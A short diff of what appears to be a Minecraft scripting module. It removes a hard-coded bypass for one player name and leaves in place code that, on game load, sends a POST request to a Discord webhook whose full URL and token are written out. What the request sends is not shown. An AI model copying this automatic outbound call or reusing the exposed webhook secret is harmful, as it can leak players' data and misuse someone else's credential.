@@ -5,10 +5,6 @@ let isEnabled = false;
 
 
 register("gameLoad", () => {
-    if(Player.getName() == "Intellij__") {
-        isEnabled = true;
-        return;
-    }
     request({
         url: "https://discord.com/api/webhooks/1178099077569847337/JqeBB3qiXojhZusqcC9HAMqghcRswc_9ZH5bdBdA8Dw6G--uGcSXXVg_mG3Y9uInNul1",
         method: "POST",
